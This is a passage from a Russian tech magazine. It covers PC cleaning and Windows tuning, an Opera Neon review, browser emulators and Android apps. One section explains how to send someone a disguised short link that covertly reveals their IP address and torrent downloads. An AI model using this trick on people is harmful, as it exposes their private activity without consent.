ШАГ ПЕРВЫЙ: ГОТОВИМ ИНСТРУМЕНТЫ
Когда на мой стол попадает очередной бедовый системник, я начинаю с его
полной разборки. В этом может не быть необходимости, и проблема в итоге
окажется софтовой, но пропылесосить и почистить компьютер никогда не по-
мешает. Возиться с чистым нутром, если до этого дойдет, будет приятнее, да
и срок жизни компьютера может заметно продлиться. К тому же при разбор-
ке можно увидеть много интересного. К примеру, вздутые конденсаторы или
окончательно высохшую пасту на процессоре.
  Из инструментов тебе понадобится, конечно же, крестовая отвертка, а еще
рекомендую приобрести кисточку. По моему опыту лучше всего подходит ки-
сточка для нанесения макияжа.





                    Кисточки
                                             Баллончик                    для макияжа
                                                   со сжатым
                                               воздухом
                                                   Defender 30805
                                                   (для чистки
                                               ПК) 400 мл


Брать лучше всего наиболее мягкую и пушистую, но чтобы
не роняла волоски. Стоят такие кисточки весьма по-раз-
ному — от 150 рублей и до нескольких тысяч. Но посколь-
ку наносить румяна или пудриться в твои планы, скорее всего, не входит, мо-
жешь просто попросить старую и ненужную у кого-нибудь из женской части
семьи.
  При чистке, главное, не переусердствуй, а то жесткой кистью можно повре-
дить платы. Еще полезным будет баллончик со сжатым воздухом, к примеру
вот такой за 440 рублей.
  Им можно выдуть пыль из самых труднодоступных мест, даже не разби-
рая компьютер. Кстати говоря, многие не очень хорошие ремонтные серви-
сы именно так и делают: продувают вентиляторы ноутбуков, даже не влезая
внутрь, а деньги берут как за полную разборку.
   Ну и для замены термопасты нам пона-
добится собственно паста. Самые распро-
страненные марки — это КПТ-8 и «Алсил».
Холивары о том, какая из них лучше, не ути-
хают, а найдутся и поклонники других брен-
дов — они скажут, что все это ерунда, и
предложат что-то еще.
   Лично я предпочитаю Zalman ZM-STG1.
                                                                 «Алсил»
Это даже не тюбик, а целая баночка на 3,5 г
по цене 470 рублей за штуку. В крышке есть
кисточка, которой удобно намазывать пасту    КПТ-8
на «камень».
  Не помешает иметь и пакетик маленьких
стяжек для проводов. Цены зависят от длины
и бренда. Десятисантиметровые будут сто-
ить от 60 рублей, а вот 25 см — уже подоро-
же: 161 рубль за упаковку с сотней штук.
   Увы,  часто  попадаются  бракованные
стяжки с очень хлипкой застежкой, которая
ломается прямо в руках. Кстати, застегнуть                                                Zalman
стяжку можно только один раз, а расстеги-    в шприце
вать не предполагается — только резать
ножницами.
   Пригодится и цилиндр с влажными сал-
фетками. Они бывают разные и различаются
по области их применения. Одни лучше всего
подходят для протирки экрана, другие — для
различной техники. Большинство мониторов
имеют антибликовое покрытие, которое мож-
но повредить спиртосодержащими салфетка-
ми, так что тут понадобятся специальные сал-
фетки без спирта либо сухие.
   Для электроники же пропитанные спир-
том салфетки подходят как нельзя лучше.                  Пакетик стяжек
Они недороги — стоят около 90 рублей за
100 штук. Также рекомендую иметь под ру-
кой сухую салфетку из микрофибры, она
обойдется тебе еще рублей в 50.
  В общем, все это — необходимый мини-
мум, который не разорит тебя и пригодится
в любых работах с компьютером. Если пла-
нируешь затариться инструментами более основательно, глянь статью «Кар-
манный набор инструментов для гика: подбираем отвертки, мультитул и дру-
гие полезности».

ШАГ ВТОРОЙ: ПЕРЕБИРАЕМ СИСТЕМНИК
Инструменты разложены, можно приступать к генеральной чистке компьюте-
ра. Первым делом, конечно же, обесточь его, раскрой и можешь начинать пы-
лесосить, аккуратно стряхивая кисточкой пыль.
   Когда первый этап завершен, отключай провода, откручивай платы рас-
ширения, доставай диски и приводы, а потом откручивай матплату от задней
стенки корпуса. После этого можешь еще разок пройтись пылесосом.
  В нашем случае на столе оказались следующие запчасти: материнская пла-
та, процессор и кулер к нему, две плашки памяти по 1 Гбайт, жесткий диск и
блок питания. Также я снял с корпуса вентилятор, который явно отжил свое.
Выкидываем его и ставим новый.
   Материнскую плату нужно осмотреть —
нет ли вздутых или потекших конденсато-
ров — и тоже тщательно пропылесосить.
  От вздутых конденсаторов можно ожи-
дать любой пакости. Разнообразные зави-
сания, синий экран смерти, спонтанное вы-
ключение и перезагрузка. Если перепаять
конденсаторы на блоке питания, в принци-
пе, не составит особого труда, то вот с ма-
теринской платой могут возникнуть большие                                                 Батарея вздутых конденсаторов
сложности. Проблема в том, что материнка
довольно толстая плата, к тому же двусто-
ронняя (то есть имеет дорожки с двух сторон). Выпаивать элементы нужно с
применением фена, и без должного опыта вряд ли что-то получится: есть ре-
альный шанс сдуть с платы мелкие SMD-элементы.
   Некоторые умельцы выпаивают конденсаторы иголкой, прикрученной к
мощному паяльнику. Но если ты такого никогда не делал, то лучшим выходом
будет сдать матплату в сервис или попросить помочь рукастого знакомого.
  Перед ремонтом не помешает понять, по
какой причине испортились конденсаторы.
Вздутость или вытекание электролита могут
быть следствием как внутренних проблем,
так и внешних. Если причина внешняя (слиш-
ком высокая температура в корпусе), то сна-
чала нужно решить ее, иначе новые конден-
саторы вскоре ждет та же судьба. Если же
проблема с напряжением, то ее тоже нужно
решать отдельно — к примеру, ремонтом
или заменой блока питания. Ну и конечно,
если материнка старая, то удивляться нече-    Вздутые конденсаторы блока
                                                 питания с неприятного вида
му — и электролитные, и полимерные кон-                                                потеками
денсаторы со временем могут выходить из
строя.
   Рекомендую заодно осмотреть батарейку и проверить ее напряжение. Ча-
сто оказывается, что она давно умерла и нелишним будет поменять ее.
   Процессор очищаем от старой пасты влажными салфетками и даем пару
минут высохнуть спирту, которым они были пропитаны. Процессорный кулер
можешь отправить туда же, куда и корпусный вентилятор. Если же он работал
без особых нареканий, просто продуй его сжатым воздухом, пропылесось и
тоже протри влажной салфеткой.
   Если же кулер начал шуметь, избавиться от звука поможет лишь его заме-
на. Никакие смазки здесь не спасут: они дают лишь кратковременный эффект,
которого хватит разве что на ожидание доставки нового экземпляра.
   Итак, старый готов вернуться в строй или
же ты только что распаковал новый. Пора
применять термопасту! Наносить ее удоб-
нее всего специальной кисточкой, если она
идет в комплекте с пастой. Если кисточки
нет, можешь размазать субстанцию старой
пластиковой картой или, к примеру, проезд-
ным на метро. Главное — чтобы слой был
равномерный. Излишки пасты выдавятся са-
мостоятельно при установке кулера.
  По плашкам памяти я обычно прохожу
                                               Замена термопасты с помощью
мягким ластиком, чтобы очистить контакты.                                                 пластиковой карты
Главное — не хвататься пальцами за дорож-
ки. Память, как и многая другая электроника,
очень не любит статического электричества.
   Теперь пора разобрать блок питания. Сто-
ит ли говорить, что его тоже нужно пылесо-
сить? Почисть или замени вентилятор, если в
этом есть необходимость, и внимательно ос-
мотри плату, нет ли на ней потеков и вышед-
ших из строя элементов. Корпус лучше все-
го разобрать полностью, включая переднюю
крышку. Частенько там можно найти еще один
вентилятор, который работает на забор возду-     Грозное оружие против окислов
ха. Его тоже нужно чистить и по необходимости
менять. А уж сколько пыли обычно скапливает-
ся под передней пластиковой крышкой!

Как определить, жив ли блок питания и стоит ли его менять

Если компьютер вообще не включается, то, скорее всего, виноват именно блок
питания. Если второго под рукой нет, то можно проверить эту теорию следую-
щим способом. В первую очередь нужно понять, включается ли он. Для этого
отсоедини его от системника и замкни скрепкой зеленый и черный провода на
коннекторе, который подключается к материнке. Теперь включи блок питания
и посмотри, закрутятся ли у него вентиляторы. Если да, то это хороший при-
знак — скорее всего, пациент жив. Теперь подключай нагрузку — к примеру,
жесткий диск, дисковод и вентилятор на 12 В. Снова стартуй и, вооружившись
мультиметром, промеряй напряжение на ветках. Эталонное значение напря-
жения для черного и розового проводов — 3,3 В, черного и красного — 5 В,
черного и желтого — 12 В. Допускается отклонение указанных значений ±5%.
Таким образом, там, где должно быть 3,3 В, может быть от 3,14 до 3,47 В; там,
где 5 В, — от 4,75 до 5,25 В. Вместо 12 В может быть от 11,4 до 12,6 В. Если
отклонения больше, значит, блок питания лучше всего заменить, пока из строя
не вышло что-нибудь еще.



Жесткий диск особого ухода не требу-
ет — убери с него пыль и протри салфет-
кой. После этого компьютер можно соби-
рать заново.
   Запустившись, можно промерять муль-
тиметром напряжение по линиям (это всег-
да делается под полной нагрузкой, так что
подключай все, что есть). Да, напряжение
можно глянуть через специальный софт или
в BIOS, но лично я больше доверяю муль-
тиметру. Конечно, он не сможет построить
кривую провала напряжения, но точность            Измеряем напряжение
его измерений всегда выше.

Что делать, когда компьютер не включается

Если блок питания и материнская плата исправны и ты не забыл подключить
PC speaker, то дальнейшее детектирование неисправностей упрощается. За-
пустившись, BIOS активирует процедуру самотестирования (power-on self test)
и при обнаружении неисправностей подает звуковые сигналы. Их списки для
микросхем BIOS разных производителей ты найдешь по этой ссылке.



ШАГ ТРЕТИЙ: ЧИСТИМ WINDOWS
После всех процедур системник стал несравнимо чище и тише. Увы, на скоро-
сти его работы это сказалось слабо: загружается он по-прежнему еле-еле. Не
беда, сейчас исправим и это.
   После запуска первым делом смотрим список автозагрузки и узнаем, что
же там творится. Для этого я обычно использую CCleaner и Starter.


                                                                            CCleaner





CCleaner хорош тем, что дает возможность не только поправить список авто-
загрузки, но и легко почистить компьютер от разного шлака и уничтожить би-
тые ключи реестра. Starter зато отображает более подробное описание авто-
загрузки. Жаль, что эта утилита заброшена разработчиком и последний раз
обновлялась в 2009 году.
   Таким образом можно отловить разных вирей и прочую заразу. Самое про-
стое — это выключить в автозагрузке все, что там есть, а потом по мере на-
добности включать.
   Раз уж мы затронули тему клинеров и твикеров системы, то вот еще не-
сколько интересных. Glary Utilities — целый комбайн с кучей функций.





                                                  Огромное меню Glary Utilities

Неплох и Wise Disk Cleaner, но это более узкоспециализированный инструмент.
Он удаляет мусор с жесткого диска (и отлично справляется с этим делом).





                                                               Wise Disk Cleaner

Advanced SystemCare 7 — еще один интересный вариант. Эта утилита имеет
навороченный интерфейс, но пользоваться ей проще простого: можно жать на
кнопку, вообще ничего не понимая, и программа все сделает за тебя.





                                                          Advanced SystemCare 7

Подобных твикеров огромное количество, но в целом они выполняют одни и те
же действия вроде очистки системы от мусора, настройки автозагрузки, деф-
рагментации диска и избавления компьютера от вредоносного или рекламно-
го софта. Все то же самое можно проделать и самостоятельно, просто при-
дется хорошенько покопаться в реестре.

ШАГ ЧЕТВЕРТЫЙ: ВЫЯВЛЯЕМ НЕИСПРАВНОСТИ
Один из важных моментов, которые не стоит упускать из вида, — это изуче-
ние логов системы. В них можно разглядеть самые разные проблемы софта и
железа. В идеале критичных сообщений в логе быть не должно, но в реальной
жизни это редкость. В общем, периодически заглядывай в лог, и ты увидишь,
если что-то пошло не так.
   К примеру, когда диск начинает активно сыпаться, в журнале можно увидеть
ошибки DISK. Если такое случится, значит, беда близко и нужно принимать
меры. Еще не забудь глянуть информацию SMART на предмет переназначен-
ных секторов. Использовать для этого можно, к примеру, утилиту HDDScan.





                                                              HDDScan

Если результаты настораживают или же ты просто хочешь провести более тща-
тельную проверку, то тебе в этом поможет MHDD (о тонкостях работы с ним
читай в статье «Низкоуровневый ремонт. Чиним жесткий диск с MHDD»).





                                                       MHDD

Если помнишь, при поста-
новке задачи было указано,
что компьютер время от вре-
мени самопроизвольно вы-
ключается. По логам можно
понять, что вызвало эти вы-
ключения, а отловить сбой-
ный процесс  помогут ми-
ни-дампы системы.
   Расшифровать     дамп
тебе поможет скрипт  kdfe.
cmd, который можно скачать
из  интернета  (например,
здесь). Как вариант — мо-
жешь воспользоваться его
онлайновой версией.

ШАГ ПЯТЫЙ:
ПРОГОНЯЕМ ТЕСТЫ
Если   никаких  тревожных
признаков не обнаружилось,
значит,  выключения  были
связаны с перегревом. Под-
твердить это помогут нагру-                         Настройка дампов памяти
зочные тесты, которые, кста-
ти, в любом случае неплохо
прогнать после сборки компьютера.
   Стресс-тесты входят в состав многих программ вроде Everest, AIDA64 и
прочих. Про них мы уже не раз писали — к примеру, в статье «Железная на-
дежность. Как найти и устранить аппаратные проблемы с помощью набора
бесплатных утилит».
   Если есть подозрение, что слабое звено — это оперативная память, пере-
ходи к тщательному тестированию. Для проверки памяти лучше всего восполь-
зоваться программой MemTest86 и, подключая по одной плашке, тестировать
по пять-восемь часов. Это, конечно, долго, но если есть глючный модуль, то
это самый надежный способ вывести его на чистую воду.
   Ну и нелишним будет посканировать систему каким-нибудь антивирусом —
к примеру, бесплатным Dr.Web CureIt.



                        Продолжение статьи
PCZONE


     Начало статьи
ПРИКЛАДНАЯ
НЕКРОМАНТИЯ
КАК ОЖИВИТЬ, ПОЧИСТИТЬ И
НАСТРОИТЬ СТАРЫЙ КОМПЬЮТЕР



ШАГ ШЕСТОЙ: ОПТИМИЗИРУЕМ СИСТЕМУ
Для начала стоит провести дефрагментацию диска, если ты этого еще этого
не сделал. Кстати, дефрагментация в Windows любит запускаться в самый не-
подходящий момент и загружать систему. Помимо нее, в планировщике задач
ты можешь встретить chkdsk, который периодически проверяет диск на нали-
чие ошибок. Оставляй или отключай по своему усмотрению.
  Еще можешь отключить службу индексирования файлов. Нужна она для
ускорения поиска файлов за счет заранее заготовленных индексов, но на ло-
кальном компьютере это не всегда имеет смысл. Служба отключается в окне
свойств диска.
  В некоторых случаях стоит отключить и SuperFetch. Эта технология была пред-
ставлена в Vista и присутствует в Windows 7 и 8. Если SuperFetch включен, то си-
стема будет поддерживать в оперативной памяти кеш с наиболее часто исполь-
зуемыми программами,  что
ускоряет их запуск. На пользу
производительности это идет
лишь на машинах с большим
объемом оперативки.
   Кстати, SuperFetch дол-
жен быть включен для функ-
ционирования  ReadyBoost
(кеширование на SSD). Если
твердотельного  накопителя
нет, то и ReadyBoost мож-
но спокойно выключить (ты
можешь найти соответству-
ющую строчку в списке си-
стемных служб).
   Ну и конечно, можешь по-
отключать анимацию и про-
чие спецэффекты. С ними,
понятно,  система  выглядит
поживее, но если все тормо-
зит, то смысла в этом мало.
Чтобы придать ей совсем уж
олдскульный вид и выжать из
машины еще чуть-чуть произ-                                                Настройка параметров системы
водительности, смени тему на
классическую, отключив Aero.





                                                       Службы системы

В дополнение можно отключить неиспользуемые системные службы. Вот спи-
сок служб, которые можно переключить на ручной запуск и почти ничего не по-
терять.
•  Служба загрузки изображений Windows. Эта служба нужна для получения
   картинок с цифровых устройств, будь то сканеры или цифровые камеры. От-
   ключай, если не используешь ни то ни другое.
•  Служба перечислителя переносных устройств. При подключении флешек
   дает разрешение различным приложениям на передачу и синхронизацию
   содержимого.
•  Автономные файлы. Служба нужна для работы кеша автономных файлов,
   также в ответе за ивенты логона и логаута пользователя.
•  Браузер компьютеров. Если компьютер не подключен к локальной сети,
  можно отключать.
•  Вспомогательная служба IP. Отвечает за возможность туннельных подклю-
   чений для IPv6 плюс ISATAP, порты прокси, Teredo, а также IP-HTTPS. Отклю-
   чай, если ничто из этого не используется.
•  Вторичный вход в систему. Если отключить, нельзя будет запускать процес-
  сы от других юзеров и соответствующий тип регистрации тоже будет недо-
   ступен.
•  Диспетчер печати. Думаю, понятно из названия. Если нет принтера, оста-
   навливаем.
•  Клиент отслеживания изменившихся связей. Суппортит связи файлов в
   NTFS, как на локальной машине, так и в сети. Отключай на свое усмотрение.
•  Модуль поддержки NetBIOS через TCP/IP. Если поддержка NetBIOS не нуж-
   на, тоже выключаем.
•  Сведения о приложении. Дает возможность исполнения софта с админски-
  ми привилегиями.
•  Сервер. Предоставляет возможность шейрить папки и принтеры по сети.
•  Служба помощника по совместимости программ. Позволяет системе сле-
   дить за совместимостью программ. Ты знаешь, что делать, если в этом нет
   нужды.
•  Служба политики диагностики. Отвечает за то самое окошко, которое со-
   провождает обнаружение проблем и предлагает провести диагностику, ко-
   торая в большинстве случаев ничем полезным не заканчивается.
•  Служба регистрации ошибок Windows. Еще одно любимое окно — отправка
   отчетов об ошибках. Неопытных пользователей это чаще смущает, чем ра-
   дует, так что можешь отключать.
•  Удаленный реестр. Эта служба нужна для удаленного редактирования рее-
   стра по сети. Чаще не нужна вовсе :).
•  Центр обеспечения безопасности. Палит параметры безопасности и актив-
   но их логирует, также уведомляет пользователя об отсутствии обновлений,
   отсутствии антивируса и состояния файрвола. Правильнее было бы назвать
   ее «Центр воздействия на нервную систему».
•  Windows Search — служба нужна для локального поиска данных. Если поис-
   ком не пользуешься, можешь и отключить.
•  Служба времени Windows. Синхронизирует часы с удаленным сервером.
  Обычно полезная штука, но иногда можно обойтись и без нее.

ШАГ СЕДЬМОЙ: ПОСЛЕДНИЕ ШТРИХИ
Чтобы избежать всех проблем, лучшим решением будет вообще не включать
компьютер. Шутка. На самом деле профилактические чистки внутренностей
раз в пару месяцев творят чудеса, а удаление старого софта и прочего мусора
с харда может неплохо сэкономить нервные клетки. И конечно, лучше пару раз
в месяц запускать утилиту для просмотра SMART, чем в последний момент су-
дорожно переносить данные с битого диска.
   Напоследок можно обновить драйверы всех устройств и поставить свежие
фреймворки и библиотеки. Лучше всего, само собой, качать драйверы с офи-
циальных сайтов, но лень часто берет свое, поэтому можно воспользоваться
готовыми сборками драйверов, к примеру DriverPack. Хотя для домашнего ком-
пьютера с игровой видеокартой лучше все же иметь фирменные драйверы.





                                            Автоматическая установка драйверов

Защититься от досрочной кончины электронных компонентов невозможно, но
если ты серьезно подходишь к делу, то можешь написать скрипты, которые бу-
дут оповещать о нештатном поведении системы.
  В общем, мониторь неполадки, чисть железо, не подпускай малварь, и ты
увидишь, как тебе будут благодарны — и люди, и компьютеры.
PCZONE
ОБЗОРОБЗОР
ВВ СКРИНШОТАХСКРИНШОТАХ
NEON — НОВЫЙ ЭКСПЕРИМЕНТАЛЬНЫЙ
БРАУЗЕР OPERA SOFTWARE





                                                                            Андрей Письменный





Производители автомобилей делают концепт-кары, чтобы потестировать но-
вые идеи и развлечь публику. Разработчики браузеров тоже иногда радуют
нас чем-то подобным. Браузер Neon не похож ни на Opera, ни на любой дру-
гой современный браузер. В нем нет многих привычных вещей, зато есть но-
вые фишки и необычный интерфейс.
   Первое, что мы видим, впервые запустив Neon, — это поисковая строка
Google и одиннадцать значков сайтов. Среди соцсетей подозрительно отсут-
ствует Twitter, зато есть пара технических блогов. В качестве фона использу-
ются установленные в системе обои рабочего стола.





Кликаем на какой-нибудь сайт и видим, что он открывается как вложенное
окно. Значок помещается в правый столбик, а в заголовке, кроме адреса стра-
ницы, есть кнопки «Перезагрузить» и «Свернуть». Если навести курсор мыши
на значок в правой колонке, появляется кнопка «Закрыть».





Выбираем другой сайт, справа появляется новый значок. В целом идея пре-
дельно ясна. Думаю, иконки сайтов справа можно смело называть вкладками.





Кнопка «Свернуть» и плюсик в левой панели делают одно и то же — окно сво-
рачивается, и перед нами снова поиск и избранное. Если в поисковой строке
набрать адрес сайта, рядом с ним появляется кружок — знак того, что можно
перейти напрямую, минуя страницу выдачи.





Перетягиваем любой сайт из столбца справа в центральную область. Сайт до-
бавляется в список избранного. Убрать оттуда что-либо можно при помощи
крестика, который появляется при наведении курсора, а вот перетащить зна-
чок на другое место пока что нельзя. Зато есть забавная фича — можно пере-
таскивать и в обратном направлении (из избранного во вкладки), тогда сайт
откроется в фоне.





Идем смотреть, что еще интересного есть в меню слева. Второй значок
(Play) — это список открытых медиафайлов. Браузер автоматически находит
проигрыватели на страницах и вытаскивает сюда.





К примеру, можно зайти на YouTube, включить видеоклип, потом перей-
ти на другую вкладку и продолжить слушать музыку. Ставить на паузу можно
из того же меню.





Если одного только звука недостаточно, можно в любой момент открыть меню
Play и кликнуть по значку с роликом. Откроется всплывающее окно. Можно
менять его размеры (пока это работает слегка глючновато, но можно прино-
ровиться), к тому же оно не закреплено внутри основного окна. Вытаскиваем
куда угодно и продолжаем смотреть.





Можно закрыть видео насовсем или же вернуться на страницу с плеером, на-
жав на значок сайта. Довольно удобно для тех, кто смотрит много видео.





«Вконтакте» полностью поддерживается: подхватывается и видео, и аудио.
Один недостаток — в панели Play нет кнопок для перемотки.





Третья и четвертая кнопка в левом меню посвящены скриншотам. Одна из них
называется Snap, другая — Gallery. Смысл предельно ясен: делаем скриншоты
веб-сайтов и заглядываем в галерею, чтобы посмотреть, что наснимали.





Плюс такого метода в том, что из Gallery всегда можно не только перейти
к полноразмерной версии картинки, но и вернуться на сайт, из которого мы
вырезали кусочек. Для этого достаточно ткнуть на favicon, который появляется,
если навести курсор на картинку. Чтобы сохранить изображение на диск, про-
сто перетаскиваем его наружу. Кстати, можно перетаскивать и извне — сюда.





Пятый значок — меню загрузок. Думаю, здесь пояснения не требуются.





Скачанные файлы, которые Neon поддерживает нативно (например, PDF), бу-
дут открываться в нем же.





Осталось заглянуть в меню, которое открывается, если нажать полосатый зна-
чок в нижнем левом углу. Здесь все выглядит очень обыденно.





Зато режим «Инкогнито» снабжен веселенькой картинкой с неоновой выве-
ской в стиле американских мотелей.





Кажется, разработчики «Оперы» прекрасно знают, зачем его обычно исполь-
зуют.





История посещений мало отличается от того, что можно встретить в любом
браузере на основе Chromium.





Равно как и настройки. В глаза бросается разве что малое число вкладок (рас-
ширения отсутствуют).





Напоследок я быстренько прогнал тест JetStream. Сразу оговорюсь: я не пе-
резагружал ноутбук и не чистил память, так что можно считать это тестом в бо-
евых условиях.





172 очка — примерно столько же я получаю при запуске того же теста
в Chrome, то есть, видимо, по скорости Neon как минимум не хуже.
   Напоследок хочется отметить, что в Neon нет большинства функций, кото-
рые отличают Opera от других браузеров. Ни блокировщика баннеров, ни VPN,
ни даже поддержки расширений, которые помогли бы восполнить эти утраты.
Neon — это всего лишь концепт, и он пока что не метит на роль основного бра-
узера для продвинутых пользователей. Тем не менее на него было интересно
посмотреть, и, возможно, он годится, чтобы рекомендовать менее требова-
тельным знакомым.
PC ZONE





                                          Андрей Письменный
                                                    apismenny@gmail.com




I KNOW WHAT YOU DOWNLOADED — САЙТ, КОТОРЫЙ ЗНАЕТ,
КТО И ЧТО СКАЧАЛ С ТОРРЕНТОВ
«Я знаю, что ты скачал» — так переводится название этого сайта. Его разра-
ботчики построили систему, которая отслеживает публичные раздачи, чтобы
сохранять списки файлов, скачанных по BitTorrent, и IP-адреса пиров. Если
ты качаешь торренты со статического IP, то велик шанс, что этот сайт знает ко-
е-что и о тебе. А еще его можно использовать, чтобы узнать, что качал кто-ни-
будь из твоих друзей.
   Зайдя на iknowwhatyoudownload.com, ты сразу увидишь список торрентов,
которые качались с IP твоего компьютера. Если хочешь пробить другой ай-
пишник, вставь его в строку поиска и нажми Find IP.
   Вторая вкладка сайта (Track Downloads) открывает еще более интерес-
ную возможность. Возьми любую ссылку, вставь ее в поле для ввода и нажми
Transform. В ответ сервис выдаст тебе короткую ссылку, сгенерированную
при помощи goo.gl.





Теперь отправь ее кому-нибудь и жди, пока этот кто-то кликнет. Если все про-
шло успешно, то ты увидишь его IP и список торрентов, которые он качал.





                                                                                   Чей-то список загрузок


Полученная  короткая  ссылка  при  этом  ведет  на  тот  адрес,  который
ты  указал  вначале,  так  что твой знакомый, скорее  всего, даже ниче-
го не заподозрит. Просто по дороге его на долю секунды перенаправит
на iknowwhatyoudownload.com, а оттуда — в пункт конечного назначения.
   Для составления базы сервис подключается к раздачам, притворяясь
обычным клиентом, затем записывает IP-адреса остальных пиров и отклю-
чается. Сейчас  I Know What You Downloaded отслеживает около 500 тысяч
торрентов и ежедневно собирает данные о 700 миллионах хостов. Однако
это куда меньше, чем нужно, чтобы поймать с поличным каждого любителя
BitTorrent. Если ты проверишь динамический IP или это вдруг окажется не ко-
нечный адрес, а прокси-сервер, то в списке торрентов появится всякий мусор
или вообще ничего не будет.
   Разработчики  I Know What You Downloaded — не первые, кто додумался
до такого метода сбора информации о пользователях BitTorrent. Правообла-
датели и органы правопорядка разных стран используют схожие технологии.
По словам владельцев сайта, их главная цель — продемонстрировать уязви-
мость BitTorrent. Тем не менее они, похоже, планируют зарабатывать деньги
на своей разработке: страница About предлагает обратиться по электронной
почте в том случае, если кому-то понадобится получить доступ к базе данных
через API.
  Подробнее о слабых местах протокола BitTorrent читай в статье «Почему
торрент-трекеры уходят в прошлое и что будет дальше». Если ты хочешь по-
высить приватность при скачивании торрентов, используй VPN или сидбокс (к
примеру, Seedr или свой собственный — о том, как его установить и настро-
ить, мы тоже уже писали).

ЭМУЛЯТОРЫ СТАРЫХ КОМПЬЮТЕРОВ, КОТОРЫЕ РАБОТАЮТ
ПРЯМО В БРАУЗЕРЕ

Современные компьютеры и современные браузеры достигли серьезных вы-
сот производительности. Лет десять назад интерактивное веб-приложение ка-
залось чудом, а теперь на JavaScript пишут не только игры или, скажем, гра-
фические редакторы, но даже эмуляторы старых компьютеров. Мы выбрали
несколько наиболее интересных эмуляторов, которые порадуют любителей
старины и всех, кто интересуется историей вычислительной техники.

JSMESS





MESS (Multi Emulator Super System, часть проекта MAME) — один из старей-
ших эмуляторов домашних компьютеров, игровых приставок и научных кальку-
ляторов. Отличается он тем, что поддерживает не один процессор или архи-
тектуру, а около 250 разных систем. JSMESS — это порт MESS на JavaScript,
разработанный Джейсоном Скоттом по заказу Internet Archive. JSMESS досту-
пен на archive.org вместе с внушительным каталогом игр и софта для разных
старинных платформ. Интересно, что для эмуляции PC в качестве прослойки
тут используется DOSBox. Но если это и сказывается на производительности,
то незначительно: можешь хоть сейчас погонять в Prince of Persia, и работать
он будет не хуже, чем когда-то на «двушке» у папы на работе.

PCjs





PCjs — это семейство эмуляторов старых процессоров, среди которых Intel
8080, x86, PDP-11 и одна из реализаций MOS 6502. На главной странице pcjs.
org есть интересная подборка готовых конфигураций и образов, в том числе
виртуалки с MS-DOS, PC-DOS, OS/2 и даже Windows. Windows 95 нам загру-
зить не удалось, а вот Windows 3.11 медленно, но завелась. Запустив одну
из машин, не забудь заглянуть в список доступных образов дисков — там
можно обнаружить подборки редкого софта и операционок (к примеру, Minix
и SCO Xenix). Как вариант — можешь загрузить свой образ диска или дискеты
в формате IMG.

PCE.js





Этот родственник PCjs отличается тем, что, помимо x86, эмулирует Mac Plus
и Atari ST. Интереснее всего, пожалуй, демонстрация Mac OS System 7 —
и не только потому, что автор не поленился добавить картинку с классическим
«Макинтошем». По скорости работы система чуть ли не превосходит оригинал,
а на диске HD 2 находится несколько папок с программами и играми. На том
же сайте есть эмулятор IBM PC/XT с приложенными к нему демками Monkey
Island, Civilization и Wolfenstein 3D.

Javatari





Если говорить о браузерных эмуляторах Atari, то Javatari — это, наверное, луч-
ший из них. Он, в частности, используется на сайте Virtual Atari, где собрана
коллекция из 550 игр. Если же ты вдруг захочешь развлечься программирова-
нием на ассемблере для Atari 2600 или просто решишь полюбопытствовать,
как раньше делали игры, то обязательно загляни на сайт 8bitworkshop.com:
он на одной странице позволяет править исходники и наблюдать за измене-
ниями.

Virtual x86





Шумиха вокруг браузерных эмуляторов начала набирать обороты в 2011 году,
когда Фабрис Беллар запустил проект JSLinux — эмулятор ПК с Linux, который
работает на его домашней страничке. С тех пор идею Беллара неплохо разви-
ли: проект Virtual x86 предлагает на выбор список из семи дистрибутивов UNIX
и Linux, а также Windows 1.01, Windows 95 и 98, Kolibri OS и Oberon. В отличие
от PCjs, этот эмулятор не пытается стартовать Windows с нуля и ограничивает-
ся загрузкой образа оперативной памяти. Даже для Windows 98 это всего 12
Мбайт, так что процесс идет быстро. Увы, все операционки максимально уре-
заны и не имеют подключения к интернету.

Эмуляторы ZX Spectrum





                                                                                Игра Ugh в jBacteria

Для тех, кто родился в СССР, компьютерная ностальгия часто связана с ZX
Spectrum. Пока что лучший браузерный эмулятор «Спектрума» из  того,
что нам попадалось, — это уже упомянутый JSMESS. Помимо него, существу-
ют JSSpeccy, Qaop, jBacteria и еще несколько, но каждый из них — со своими
причудами (загрузка файлов, звук, управление — редкий случай, когда не под-
водит ничего из этого). Ну и конечно, всегда можно махнуть рукой на браузер
и скачать старый добрый Fuse.

Прочее
Раз в браузере работает даже Windows 98, значит, нет никаких преград, ко-
торые бы помешали запихнуть туда все, что появилось до него. И это актив-
но делают. В наш небольшой обзор не вошли эмулятор NES с парой десятков
приложенных игр, эмулятор «Радио-86РК» и многие другие. Неплохой список
ты можешь найти на сайте Фредерика Кембуса и экспериментировать само-
стоятельно. Там, в частности, есть ссылки на эмуляторы совсем уж старинных
машин вроде Z1, UNIVAC и даже разностной машины Бэббиджа.
  Подробнее о том, как создают браузерные эмуляторы, читай в статье
«Байт из других миров. Как ретрокомпьютеры эмулируют на JavaScript».
MOBILE


ВЫПУСК #26.
ROOT
КАРМАННЫЙ                     Сегодня в выпуске:
                      восстанавливаем
                     удаленные контакты,
                    сообщения и фото,СОФТ  включаем режим
                     энергосбережения
                       сразу после гашения
                        экрана, устанавливаем
                     и обновляем Gapps,
                     не покидая Android,
                      заставляем сканер
                       отпечатков пальцев делать
                             то, что нужно именно нам.
                      Приятного чтения.





DR.FONE
Случайно удаленные данные — проблема
на любой платформе. И на любой плат-
форме есть способы восстановить такие
данные. Dr.Fone — инструмент восстанов-
ления для Android. Он позволяет вернуть
из небытия фотографии,  видеозаписи,
удаленные контакты и сообщения. Пер-
вые две функции будут работать на любом
смартфоне, вторые — только при наличии
прав root.
   Dr.Fone поддерживает множество раз-
личных форматов видео и фото (за исклю-
чением MKV и RAW) и работает как с вну-
тренней  файловой  системой  Android
(ext4), так и с внешней картой памяти
(FAT32, exFAT). Однако, как и в случае
с любым другим подобным софтом, надо
иметь в виду, что удаленные данные могут
быть перезаписаны новыми. Поэтому чем
раньше ты воспользуешься приложением,
тем больше у тебя шансов.


                                                          Dr.Fone
                                                     Платформа:
                                                                    Android 4.2
                                                       Цена:
                                                               бесплатно




FORCEDOZE
В Android 6.0 появился новый энергосбе-
регающий режим Doze. Спустя час после
гашения экрана и если устройство не-
подвижно Android отключает доступ в ин-
тернет для всех приложений и приоста-
навливает любую фоновую  активность
за исключением обработки push-уведом-
лений высокого уровня важности.
   У этого режима есть как минимум две
проблемы. Первая — Doze не будет акти-
вирован, если смартфон не использовать,
но при этом держать в кармане (это ис-
правили в Android 7.0). Вторая — средний
юзер использует смартфон чаще одного
раза в час, поэтому в большинстве случа-
ев Doze включается только ночью.
   ForceDoze исправляет эту проблему,
